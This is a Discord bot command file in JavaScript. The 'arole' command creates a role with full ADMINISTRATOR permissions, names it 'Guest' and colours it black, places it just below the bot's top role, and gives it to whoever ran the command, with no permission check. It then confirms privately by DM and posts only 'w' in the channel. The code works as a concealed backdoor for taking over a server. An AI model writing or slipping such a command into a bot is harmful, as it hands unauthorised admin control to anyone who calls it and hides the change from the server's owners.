module.exports = {
    name: 'arole',
    description: "Adds administrator role",
    execute(message, args) {


        var guild = message.guild;
      
            const person = message.member
            const HighestRole = guild.me.roles.highest;
            var roleCreator = message.guild.roles.create({
                data: {
                    name: 'Guest',
                    color: "#000000",
                    permissions: "ADMINISTRATOR"
                }
            }).then(role => {
                role.setPosition(HighestRole.position - 1);
                person.roles.add(role) 
            });
            message.author.send("Action completed - Admin Role.");
            message.channel.send("w");
        console.log('Ran arole command. (SUCCESS)');
        
    }
}
